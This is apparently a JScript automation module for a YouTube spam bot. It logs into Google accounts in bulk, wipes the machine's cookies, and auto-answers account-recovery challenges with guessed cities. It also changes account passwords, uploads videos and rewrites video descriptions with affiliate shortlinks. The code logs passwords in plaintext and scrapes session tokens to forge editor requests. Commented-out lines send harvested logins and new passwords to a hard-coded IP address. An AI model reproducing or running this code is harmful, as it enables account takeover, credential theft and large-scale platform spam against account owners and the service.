"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
var utils_1 = require("../../common/utils");
var activex_1 = require("../../common/activex");
var browser_1 = require("../browser");
var utils_2 = require("../../common/utils");
var mouse_1 = require("./mouse");
activex_1.shell.CurrentDirectory = utils_2.me;
var lmeanswer = '';
var _errors;
exports.login = function (login, password) {
    var roaming = activex_1.shell.SpecialFolders.Item("AppData");
    var path = roaming + "\\Microsoft\\Windows\\Cookies";
    activex_1.shell.Run("cmd" + " /C echo Y|del /F /S /Q \"" + path + "\"", 0, true);
    browser_1.initIE();
    if (browser_1.ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 9.0") != -1 || browser_1.ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 8.0") != -1)
        WScript.Quit();
    utils_1.log('UserAgent:' + browser_1.ieb.document.parentWindow.navigator.userAgent + ' Language:' + browser_1.ieb.document.parentWindow.navigator.language);
    var logout = function () {
        if (browser_1.ieb.document.getElementById("yt-picker-language-button")) {
            utils_1.log("element yt-picker-language-button");
            try {
                browser_1.ieb.document.getElementById("yt-picker-language-button").click();
                browser_1.wait("etElementById(yt-picker-language-button");
                var spans = browser_1.ieb.document.getElementById("yt-picker-language-footer").getElementsByTagName("span");
                for (var l = 0; l < spans.length; l++)
                    if (spans[l].innerHTML.indexOf("Русский") != -1) {
                        spans[l].parentNode.click();
                        browser_1.wait("LOGOUT WAIT!");
                        break;
                    }
            }
            catch (langerr) { }
        }
        browser_1.ieb.Navigate("https://accounts.google.com/AccountChooser");
        browser_1.wait("https://accounts.google.com/AccountChooser");
        if (browser_1.ieb.document.body.innerHTML.indexOf("This page can’t be displayed") != -1) {
            utils_1.log("this page cant be displayed!!!");
            browser_1.initIE();
            browser_1.ieb.Navigate("https://accounts.google.com/AccountChooser");
            browser_1.wait("https://accounts.google.com/AccountChooser");
        }
        if (browser_1.ieb.document.body.innerHTML.indexOf(login) != -1) {
            utils_1.log("Already logined!");
            return "LOGINED";
        }
        if (browser_1.ieb.document.getElementById("edit-account-list")) {
            utils_1.log("element edit-account-list");
            try {
                browser_1.ieb.document.getElementById("edit-account-list").click();
                utils_2.delay(5000);
                var caccs = browser_1.ieb.document.getElementsByName("Email");
                var ca_length = caccs.length;
                utils_1.log("Elements found: " + ca_length);
                for (var ai = 0; ai < ca_length; ai++) {
                    utils_1.log("Clicking: " + caccs[0].id);
                    caccs[0].click();
                    utils_2.delay(15000);
                }
                browser_1.ieb.document.getElementById("edit-account-list").click();
                utils_2.delay(5000);
            }
            catch (ermaccs) { }
        }
        return true;
    };
    if (logout() == "LOGINED")
        return;
    if (browser_1.ieb.document.getElementById("account-chooser-add-account")) {
        utils_1.log("INNER: " + browser_1.ieb.document.getElementById("account-chooser-add-account"));
        activex_1.fso.createTextFile(utils_2.me + "/ie_DEBUG.txt").Write(encodeURIComponent(browser_1.ieb.document.body.innerHTML));
        utils_1.log("element account-chooser-add-account");
        try {
            browser_1.ieb.document.getElementById("account-chooser-add-account").click();
            browser_1.wait("getElementById(account-chooser-add-account");
        }
        catch (ace) { }
    }
    var nextButton;
    if (browser_1.ieb.document.getElementById("identifierId")) {
        browser_1.imitate_input(browser_1.ieb.document.getElementById("identifierId"), login);
        nextButton = browser_1.ieb.document.getElementById("identifierNext");
    }
    else {
        browser_1.imitate_input(browser_1.ieb.document.getElementById("Email"), login);
        nextButton = browser_1.ieb.document.getElementById("next");
    }
    utils_1.log("enter login: " + login);
    if (browser_1.ieb.document.getElementById("next") || browser_1.ieb.document.getElementById("identifierNext")) {
        utils_1.log("element next");
        try {
            nextButton.click();
            utils_2.delay(7000);
            var errormsg_0_Email = "";
            try {
                errormsg_0_Email = browser_1.ieb.document.getElementById("errormsg_0_Email").innerHTML;
            }
            catch (err_errormsg_0_Email) { }
            if (errormsg_0_Email != "" ||
                browser_1.getElementsByClassName(browser_1.ieb.document, "LXRPh")[0].innerText.length > 2) {
                utils_1.log("Account locked 839");
                //ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+login+"&descr=bad","","");
                activex_1.shell.Run("tskill cmd2", 1, true);
            }
        }
        catch (err) { }
    }
    utils_1.log("ieb.document.getElementsByName(password).length " + browser_1.ieb.document.getElementsByName("password").length);
    for (var i = 0; i < 2; i++) {
        if (browser_1.ieb.document.getElementsByName("password").length >= 1) {
            utils_1.log("password TYPE: " + browser_1.ieb.document.getElementsByName("password")[0].type);
            browser_1.imitate_input(browser_1.ieb.document.getElementsByName("password")[0], password);
        }
        else if (browser_1.ieb.document.getElementById("Passwd")) {
            utils_1.log("Passwd TYPE: " + browser_1.ieb.document.getElementById("Passwd").type);
            browser_1.imitate_input(browser_1.ieb.document.getElementById("Passwd"), password);
        }
        utils_1.log("enter password: " + password);
        if (browser_1.ieb.document.getElementById("PersistentCookie")) {
            utils_1.log("element PersistentCookie");
            try {
                browser_1.ieb.document.getElementById("PersistentCookie").checked = "checked";
            }
            catch (ertypdadd) {
                utils_1.log("PersistentCookie error: " + ertypdadd.message);
            }
        }
        if (browser_1.ieb.document.getElementById("passwordNext")) {
            browser_1.ieb.document.getElementById("passwordNext").click();
        }
        else if (browser_1.ieb.document.getElementById("signIn")) {
            browser_1.ieb.document.getElementById("signIn").click();
        }
        utils_2.delay(2000);
        browser_1.wait("getElementById(signIn or passwordNext)");
    }
    if (browser_1.ieb.document.body.innerHTML.indexOf("id=\"submitSms\"") != -1) {
        utils_1.log("Need LOGIN FROM UKRAINE 479");
        return "bad_acc_login";
    }
    if (browser_1.ieb.document.body.innerHTML.indexOf("id=\"challengeId") != -1 && browser_1.ieb.document.body.innerHTML.indexOf("id=\"submitSms\"") == -1) {
        utils_1.log("Need ENTER CITY");
        try {
            browser_1.ieb.document.getElementById("answer").value = "kharkiv";
            utils_2.delay(2000);
            browser_1.ieb.document.getElementById("submit").click();
            browser_1.wait("getElementById(submit_0");
        }
        catch (e) { }
        try {
            browser_1.ieb.document.getElementById("answer").value = "kyiv";
            utils_2.delay(2000);
            browser_1.ieb.document.getElementById("submit").click();
            browser_1.wait("getElementById(submit_1");
        }
        catch (e) { }
        if (browser_1.ieb.document.getElementById("error") != null ||
            browser_1.ieb.document.getElementById("errormsg_0_Passwd") != null) {
            return "bad_acc_login";
        }
    }
    if (browser_1.ieb.document.body.innerHTML.indexOf("name=\"deviceAddress\"") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("name=\"SendCode\"") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("MapChallengeOption") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("ваш аккаунт Google заблокирован") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Неверный пароль") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Wrong password") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Указан неправильный адрес или пароль") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Не удалось распознать адрес электронной почты") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Неверное имя пользователя или пароль") != -1 ||
        browser_1.ieb.document.body.innerHTML.indexOf("Sorry, Google doesn't recognize that email") != -1) {
        utils_1.log("Account locked");
        return "bad_acc";
    }
    if (browser_1.ieb.document.getElementById("SecretQuestionChallenge")) {
        utils_1.log("element SecretQuestionChallenge");
        try {
            utils_1.log("SecretQuestionChallenge");
            browser_1.ieb.document.getElementById("SecretQuestionChallenge").click();
            utils_2.delay(2000);
        }
        catch (errtyq) { }
    }
    if (browser_1.ieb.document.getElementById("answer")) {
        utils_1.log("element answer");
        try {
            browser_1.ieb.document.getElementById("answer").value = lmeanswer;
            utils_2.delay(2000);
            browser_1.ieb.document.getElementById("submitChallenge").removeAttribute("disabled");
            browser_1.ieb.document.getElementById("submitChallenge").click();
            browser_1.wait("getElementById(submitChallenge_1");
        }
        catch (errtyq) { }
    }
    if (browser_1.ieb.document.getElementById("address")) {
        utils_1.log("element address");
        try {
            browser_1.ieb.document.getElementById("address").value = "Kiev";
            utils_2.delay(2000);
            browser_1.ieb.document.getElementById("submitChallenge").click();
            browser_1.wait("getElementById(submitChallenge_2");
        }
        catch (e) { }
    }
    var newpassword = password;
    if (browser_1.ieb.document.getElementById("PasswdAgain")) {
        utils_1.log("element PasswdAgain");
        try {
            var randle = "abcdefghijklmnopqrstuvwxyz".substr(parseInt(Math.random() * 26 + ''), 1);
            browser_1.ieb.document.getElementById("Passwd").value = password + randle;
            browser_1.ieb.document.getElementById("PasswdAgain").value = password + randle;
            utils_2.delay(2000);
            browser_1.ieb.document.getElementsByName("submitButton")[0].click();
            browser_1.wait("submitButton)[0].click()");
            newpassword = password + randle;
            utils_1.log("New password: " + newpassword);
            //ajax.sendReport("POST", "http://37.59.246.141/youtube/" ,"accounts="+login+";"+newpassword+"*"+lmeanswer);
        }
        catch (e) { }
    }
    utils_1.log("WE HERE!");
    if (browser_1.ieb.document.getElementById("save")) {
        utils_1.log("element save");
        try {
            browser_1.ieb.document.getElementById("save").click();
            browser_1.wait("getElementById(save)");
        }
        catch (e) { }
    }
    if (browser_1.ieb.document.getElementById("cancel")) {
        utils_1.log("element cancel");
        try {
            browser_1.ieb.document.getElementById("cancel").click();
            browser_1.wait("getElementById(cancel)");
        }
        catch (e) { }
        browser_1.wait("unknown WAIT");
    }
    try {
        browser_1.getElementsByClassName(browser_1.ieb.document, "c-sa-ra a-b a-b-G Zg")[0].click();
        utils_1.log("CLICKED CLASS -> c-sa-ra a-b a-b-G Zg");
        utils_2.delay(5000);
    }
    catch (ettoor) {
        utils_1.log("CANT FIND CLASS -> c-sa-ra a-b a-b-G Zg");
    }
    browser_1.ieb.Navigate("http://youtube.com");
    browser_1.wait("loading youtube page");
    var signInContainer = browser_1.getElementsByClassName(browser_1.ieb.document, 'signin-container')[0];
    if (signInContainer && signInContainer.getElementsByTagName("button")[0]) {
        signInContainer.getElementsByTagName("button")[0].click();
        browser_1.wait("signing in on youtube");
        utils_2.delay(5000);
    }
    if (browser_1.ieb.document.body.innerHTML.indexOf("create_channel") != -1) {
        utils_1.log("(create_channel) !=-1");
        browser_1.ieb.Navigate("https://www.youtube.com/create_channel");
        browser_1.wait("create_channel");
        utils_2.delay(5000);
        mouse_1.default.addVideo1();
        mouse_1.default.addVideo2();
        mouse_1.default.createChannel1();
        mouse_1.default.createChannel2();
        browser_1.wait("wait for creation");
    }
    utils_1.log("Login Finished");
    return newpassword;
};
exports.enterEditor = function () {
    browser_1.ieb.Navigate('https://www.youtube.com/editor');
    browser_1.wait('');
};
exports.uploadVideo = function (path, inform) {
    utils_1.log(path, 'uplpath');
    browser_1.ieb.Navigate('https://www.youtube.com/upload');
    browser_1.wait('https://www.youtube.com/upload');
    if (browser_1.ieb.document.body.innerHTML.indexOf('warning-header-text') !== -1)
        return { status: 'CLAIM', id: 0, totalTime: 0 };
    activex_1.shell.Run("tskill upload", 0, true);
    WScript.Sleep(4000);
    if (browser_1.ieb.document.body.innerHTML.indexOf('warning-header-text') !== -1)
        return { status: 'CLAIM', id: 0, totalTime: 0 };
    activex_1.shell.Run(activex_1.fso.getFile(utils_2.me + "\\programs\\upload.exe").shortPath + " " + path + "|test", 1);
    WScript.Sleep(4000);
    browser_1.ieb.document.getElementById('start-upload-button-single').click();
    utils_1.log('init uploading...');
    WScript.Sleep(60000);
    if (browser_1.getElementsByClassName(browser_1.ieb.document, 'watch-page-link').length < 1 || browser_1.getElementsByClassName(browser_1.ieb.document, 'upload-item-failed').length > 0) {
        return { status: 'OK', id: 0, totalTime: 10000000 };
    }
    var videoLink = browser_1.getElementsByClassName(browser_1.ieb.document, 'watch-page-link')[0].getElementsByTagName('a')[0].href;
    browser_1.getElementsByClassName(browser_1.ieb.document, 'video-settings-description')[0].innerHTML = inform;
    WScript.Sleep(4000);
    browser_1.getElementsByClassName(browser_1.ieb.document, 'save-changes-button')[0].click();
    WScript.Sleep(15000);
    var totalTime = 90000;
    while (browser_1.getElementsByClassName(browser_1.ieb.document, 'upload-item-with-share-panel').length < 1 && totalTime < 1000000) {
        utils_1.log('uploading...');
        WScript.Sleep(5000);
        totalTime += 5000;
    }
    utils_1.log('totaltime', totalTime);
    return { id: videoLink.split('be/')[1], status: 'OK', totalTime: totalTime };
};
exports.uploadPhotoArray = function (photoArray) {
    browser_1.ieb.Navigate('https://www.youtube.com/editor');
    browser_1.wait('https://www.youtube.com/editor');
    if (browser_1.ieb.document.body.innerHTML.indexOf('warning-header-text') !== -1)
        return 'CLAIM';
    activex_1.shell.Run("tskill upload", 0, true);
    mouse_1.default.watchvid();
    WScript.Sleep(4000);
    mouse_1.default.sep20();
    WScript.Sleep(4000);
    mouse_1.default.sep202();
    WScript.Sleep(4000);
    mouse_1.default.closeX();
    mouse_1.default.flash();
    mouse_1.default.teamviewer();
    mouse_1.default.close_lang();
    mouse_1.default.close_lang2();
    mouse_1.default.add_photo();
    mouse_1.default.more();
    WScript.Sleep(25000);
    mouse_1.default.upl_photo();
    WScript.Sleep(5000);
    var path_data = photoArray.map(function (item) { return "\"" + item + "\""; }).join(' ');
    activex_1.shell.Run(activex_1.fso.getFile(utils_2.me + "\\programs\\upload.exe").shortPath + " " + path_data + "|test", 1);
    utils_1.log("FileDialog hooker started");
    WScript.Sleep(2000);
    mouse_1.default.select_photo();
    mouse_1.default.select_photo2();
    mouse_1.default.select_photo3();
    utils_1.log("FileDialog window opened");
    WScript.Sleep(7000);
    utils_1.log("FileDialog OK");
    activex_1.shell.Run("tskill upload", 0, true);
};
exports.generateVideoFromImage = function (params) {
    utils_1.log("generateVideoFromImage()");
    var dataArr, headers, session_token, encrypted_project_id;
    sendData("GET", "https://www.youtube.com/editor?feature=upload", "", "");
    dataArr = preloadedData(activex_1.xmlHttp.responseText);
    headers = dataArr.header;
    session_token = dataArr.session_token;
    encrypted_project_id = dataArr.encrypted_project_id;
    sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_get_images=1", '{"encrypted_project_id":"' + encrypted_project_id + '","action_get_images":1,"session_token":"' + session_token + '","o":"U"}', headers);
    var imagesIds = JSON.parse(activex_1.xmlHttp.responseText).images.map(function (item) { return item.id; });
    utils_1.log(imagesIds.length);
    if (imagesIds.length <= 0)
        return;
    var bannerEffect = {
        "id": "BANNER",
        "parameters": {
            "banner_height": "30",
            "h_align": "CENTER",
            "banner_opacity": "50",
            "label": params.firstPicText,
            "font_face": "Open Sans",
            "v_align": "CENTER",
            "banner_color": "#000000",
            "color": "#ffffff",
            "font_size_class": "xsmall"
        }
    };
    var videoCreatorParams = {
        "vc": imagesIds.map(function (item, index) { return ({
            "type": "image",
            "id": item,
            "start_ms": 0,
            "end_ms": params.frameTime,
            "length_ms": params.frameTime,
            "effects": index === 0 ? [bannerEffect] : [],
            "image_type": "p"
        }); }),
        "ac": [],
        "encrypted_project_id": encrypted_project_id,
        "title": params.title.substr(0, 100),
        "action_publish": 1,
        "session_token": session_token,
        "o": "U"
    };
    sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_publish=1", JSON.stringify(videoCreatorParams), headers);
    var fileId;
    try {
        fileId = JSON.parse(activex_1.xmlHttp.responseText).video_id;
    }
    catch (err) {
        utils_1.log('Limit reached');
        return 0;
        //WScript.Quit();
    }
    if (params.allowDescription) {
        exports.ChangeInfo(fileId, params.inform);
    }
    return fileId;
};
exports.changeInfoAll = function (videoCount) {
    utils_1.log("changeInfoAll()");
    for (var pi = 0; pi < videoCount / 30; pi++) {
        sendData("GET", "https://www.youtube.com/my_videos?o=U&pi=" + (pi + 1), "", []);
        var mass = activex_1.xmlHttp.responseText.split("id=\\\"vm-video-");
        if (mass.length <= 1)
            return;
        for (var i = 1; i < mass.length; i++) {
            //videoData = genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath);
            var video_id = mass[i].split("\\\"")[0];
            utils_1.log("video_id: " + video_id);
            exports.ChangeInfo(video_id, 'newinfo');
            WScript.Sleep(60000);
        }
    }
    utils_1.log("changing ok");
};
exports.ChangeInfo = function (fileid, inform) {
    WScript.Echo(fileid + " заполнение информации... ");
    var doccha = new ActiveXObject("HTMLFile");
    sendData("GET", "https://www.youtube.com/edit?video_id=" + fileid, "", "");
    doccha.open();
    doccha.write(activex_1.xmlHttp.responseText);
    doccha.close();
    var dataArr = preloadedData(activex_1.xmlHttp.responseText);
    var headers = dataArr.header;
    var session_token = encodeURIComponent(dataArr.session_token);
    ///INFO FIXER
    /*
    const shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getadult&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getalinew&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getalinew&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getalinew&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getalinew&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getalinew&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    const shortPath = shortPathArr[Math.floor(shortPathArr.length * Math.random())];

    const prevInfo = doccha.getElementsByTagName('textarea')[0].innerHTML;
    if (prevInfo.indexOf('alipromo') === -1) return;
    const prevLink = 'http://' + prevInfo.split('http://')[1].split(' ')[0];
    const prevProductId = prevLink.split('/').reverse()[1];
    inform = prevInfo.replace(prevLink, "http://"+sendData("POST", shortPath + "&productid=" + prevProductId , "", ""));
    */
    /////////////
    var postdata = [
        "notify_via_email=true",
        "share_emails",
        "deleted_ogids",
        "deleted_circle_ids",
        "deleted_emails",
        "privacy_draft=none",
        "thumbnail_preview_version",
        "session_token=" + session_token,
        "updated_flag=0",
        "video_id=" + fileid,
        "content_id=",
        "title=" + encodeURIComponent(doccha.forms[2].title.value),
        "description=" + encodeURIComponent(inform),
        "keywords=" + encodeURIComponent(doccha.forms[2].title.value),
        "still_id=2",
        "creator_share_custom_message=",
        "captions_certificate_reason=",
        "privacy=public",
        "category=22",
        "allow_comments=no",
        "creator_share_feeds=yes",
        "reuse=all_rights_reserved",
        "audio_language",
        "recorded_date",
        "allow_public_stats=yes",
        "creator_share_gplus=no",
        "creator_share_twitter=no",
        "self_racy=no",
        "captions_crowdsource=no",
        "allow_comments_detail=approval",
        "allow_comment_ratings=yes",
        "allow_ratings=yes",
        "allow_responses=yes",
        "allow_responses_detail=approval",
        "allow_syndication=yes",
        "allow_embedding=yes",
        "location_latitude",
        "location_longitude",
        "location_altitude",
        "recorded_date",
        "threed_type=default",
        "threed_type_original=default",
        "threed_layout=1",
        "modified_fields=description%2Callow_comments%2Cprivacy"
    ];
    sendData("POST", "https://www.youtube.com/metadata_ajax?action_edit_video=1", postdata.join("&"), headers);
    WScript.Echo("Информация заполнена!");
};
function preloadedData(data) {
    var t = activex_1.fso.CreateTextFile(utils_2.me + "/preloaded_DEBUG.txt");
    t.Write(encodeURIComponent(data));
    t.close();
    var session_token;
    var X_YouTube_Variants_Checksum;
    var X_YouTube_Page_Label;
    var X_YouTube_Page_CL;
    var X_YouTube_Client_Version;
    var encrypted_project_id;
    try {
        session_token = data.split("XSRF_TOKEN': \"")[1].split("\"")[0];
        X_YouTube_Variants_Checksum = data.split("VARIANTS_CHECKSUM': \"")[1].split("\"")[0];
        X_YouTube_Page_Label = data.split("PAGE_BUILD_LABEL': \"")[1].split("\"")[0];
        X_YouTube_Page_CL = data.split("PAGE_CL': ")[1].split(",")[0];
        X_YouTube_Client_Version = data.split("INNERTUBE_CONTEXT_CLIENT_VERSION: \"")[1].split("\"")[0];
    }
    catch (poweqezsda) {
        WScript.Echo("ERRRO");
    }
    try {
        encrypted_project_id = data.split("VIDEO_EDITOR_PROJECT_LIST")[1].split("id\":\"")[1].split("\"")[0];
    }
    catch (yyuuuu) {
        encrypted_project_id = "";
    }
    return { header: [["X-YouTube-Variants-Checksum", X_YouTube_Variants_Checksum], ["X-YouTube-Page-Label", X_YouTube_Page_Label], ["X-YouTube-Page-CL", X_YouTube_Page_CL], ["X-YouTube-Client-Version", X_YouTube_Client_Version]], session_token: session_token, encrypted_project_id: encrypted_project_id };
}
function sendData(method, url, data, headers) {
    utils_1.log(url);
    for (var im = 1; im <= 10; im++) {
        var type = void 0;
        //try {
        switch (method) {
            case "OCTET_STREAM":
                method = "POST";
                type = "application/octet-stream";
                headers = [["X-HTTP-Method-Override", "PUT"], ["X-GUploader-No-308", "yes"], ["Connection", "Keep-Alive"], ["Cache-Control", "no-cache"]];
                break;
            case "POST_JS":
                method = "POST";
                type = "application/json";
                break;
            case "POST":
                type = "application/x-www-form-urlencoded";
                break;
        }
        activex_1.xmlHttp.abort();
        utils_1.log(method);
        utils_1.log(url);
        activex_1.xmlHttp.open(method, url, 1);
        activex_1.xmlHttp.setRequestHeader("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, image/jxr, */*;q=0.1");
        activex_1.xmlHttp.setRequestHeader("Accept-Language", "en-US,en;q=0.7,ru;q=0.3");
        activex_1.xmlHttp.setRequestHeader("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
        try {
            for (var i = 0; i < headers.length; i++) {
                activex_1.xmlHttp.setRequestHeader(headers[i][0], headers[i][1]);
            }
        }
        catch (e) { }
        if (method == "POST")
            activex_1.xmlHttp.setRequestHeader("Content-Type", type);
        activex_1.xmlHttp.send(data);
        var timer = 0;
        while (timer < 60000) {
            if (activex_1.xmlHttp.readyState == 4) {
                if (activex_1.xmlHttp.status == 200 || activex_1.xmlHttp.status == 500 || activex_1.xmlHttp.status == 400)
                    if (activex_1.xmlHttp.responseText.indexOf("errors") != -1)
                        return "next";
                return activex_1.xmlHttp.responseText;
                //if (xmlHttp.status == 12029 || xmlHttp.status == 0)
                //    throw 1;
            }
            WScript.Sleep(50);
            timer += 50;
        }
        utils_1.log('connection timeout');
        throw 1;
        //} catch(errcon) {
        //    log("ajax error " + im + " of 10 " + errcon.message);
        //    WScript.Sleep(10000);
        //}
    }
    activex_1.shell.Run("tskill cmd2", 1, true);
}
exports.sendData = sendData;
function getUploadedVideoId(responseText) {
    try {
        utils_1.log("video_id: " + responseText.split("video_id\":")[1].split("\"")[1].split("\"")[0]);
        _errors = 0;
        return responseText.split("video_id\":")[1].split("\"")[1].split("\"")[0];
    }
    catch (errt) {
        utils_1.log("1034 ERROR " + errt.message);
        activex_1.fso.CreateTextFile(utils_2.me + "/debug1034.txt").Write(encodeURIComponent(responseText));
        return "wait";
    }
}
function genVideoData(videoNamePrefix, linkDescription, allowDescription, shortPath, keywordsFile, keywordsCount, keywordsTitleMode) {
    var rvname, inform, keys;
    // keys = keywordsObject.readBase(keywordsFile, keywordsCount, keywordsTitleMode);
    // keys = ajax.getRemote();  // FORCED CAN BE REMOVED
    rvname = videoNamePrefix + (Math.ceil(1000000 + Math.random() * 9999999));
    //rvname = keys.title; // FORCED CAN BE REMOVED
    if (allowDescription)
        inform = "http://" + sendData("POST", shortPath, "", "") + " - " + linkDescription; // + "\n\n\n"+keys.keywords;
    else
        inform = "";
    return { title: rvname, inform: inform };
}
function toUnicode(theString) {
    var unicodeString = '';
    for (var i = 0; i < theString.length; i++) {
        var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();
        while (theUnicode.length < 4) {
            theUnicode = '0' + theUnicode;
        }
        theUnicode = '\\u' + theUnicode;
        unicodeString += theUnicode;
    }
    return unicodeString;
}
